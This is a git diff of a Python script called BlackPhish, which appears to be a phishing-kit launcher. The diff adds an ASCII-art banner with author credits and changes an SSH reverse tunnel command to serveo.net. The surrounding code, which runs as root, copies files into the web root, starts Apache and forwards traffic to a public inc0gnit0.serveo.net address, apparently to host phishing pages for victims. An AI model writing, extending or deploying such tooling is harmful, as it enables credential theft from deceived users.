@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-# version 1.8: - Updated bash commad - added bash execution func - added clean function
+# version 1.9: - Fixed serveo command - Added banner
 
 # Please update version number each time we update
 
@@ -38,14 +38,58 @@ white = "\033[37;1m"
 if os.geteuid() != 0:
     exit(red + "[!] Please run as root" + reset)
 
+
+
 def serveo_forward(): # Port forward to serveo#
-    os.system('nohup ssh -R inc0gnit0:80:localhost:80 serveo.net &')
+    os.system('ssh -o ServerAliveInterval=999 -R inc0gnit0:80:localhost:80 serveo.net')
     #subprocess.Popen(["rm","-r","some.file"])
+    
+def banner():
+    print('''
+ \033[91;1m
+                https://github.com/iinc0gnit0/BlackPhish \033[94;1m
+
+                             ░███░                                   ░█░   
+                           ░█████                                  ░███    
+                          ▒█████▓                                ░███░     
+                         ████████                               ████▓      
+                       ░█████████░                            ░█████       
+                     ░█████████████                          ░██████       
+          ░░▒███████████████████████████░░░                 ▓██████░       
+ ░░░░███████████████████████████████████████████▓░▒█░     ░███████░        
+█████████████████████████████████████████████████████████████████          
+ ░████████████████████████████████████████████████████████████████░        
+     ░░▓██████████████████████████████████████▓░░░██▓      ░░██████░       
+             ░░░░▒█████████████████████░████░                  ░█████░     
+                  ██████                 ░                                 
+                  ░█████                                                   
+                   ░████                                                   
+                    ░███                                                   
+                      ░█      
+                                                      \033[91m
+        ▀█████████▄                      ▀████████▄
+          ███    ███                       ███    ███  
+          ███    ███                       ███    ███ 
+          ███▄▄▄██▀                        ███    ███ 
+          ███▀▀▀██▄                        ████████▀ 
+          ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
+          ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
+        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m
+                
+                    Banner made by: [tuf_unkn0wn]
+                    
+                    Script created by: [inc0gnit0] [retro0001]
+                    
+                    Websites created by: [TableFlipGod] 
+                    
+''')
     
 
 def main():  # Main script #
+    
+    banner()
 
-    choice = input(cyan+"[BlackPhish] -> ") # Get user input #
+    choice = input(cyan + "[BlackPhish] -> ") # Get user input #
 
     if choice == "1":
         print(green + '[+] Copying Files')
@@ -55,7 +99,7 @@ def main():  # Main script #
         print(green + '[+] Starting Apache2 Service')
         os.system('service apache2 start')
         serveo_forward()
-        print(green + '[+] Forwarding Traffic to \"https://inc0gnit0.serveo.net/\"')
+        print(green + '[+] Forwarding Traffic to https://inc0gnit0.serveo.net/')
         print(green + '[+] Done')
         main()
 
